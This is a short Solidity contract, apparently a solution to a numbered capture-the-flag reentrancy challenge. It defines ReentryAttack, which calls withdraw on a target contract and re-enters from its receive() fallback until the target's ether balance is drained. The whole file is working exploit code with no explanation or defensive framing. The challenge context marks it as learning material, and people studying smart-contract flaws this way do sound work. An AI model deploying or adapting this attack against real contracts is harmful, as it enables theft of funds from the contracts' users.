// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./10_reentrancy.sol";

contract ReentryAttack {
    Reentrance _target;

    constructor(address payable _addr) public {
        _target = Reentrance(_addr);
    }

    function attack() public {
        require(_target.balanceOf(address(this)) > 0);
        _target.withdraw(0.01 ether);
    }

    receive() external payable {
        if (address(_target).balance > 0) {
            _target.withdraw(0.01 ether);
        }
    }

}
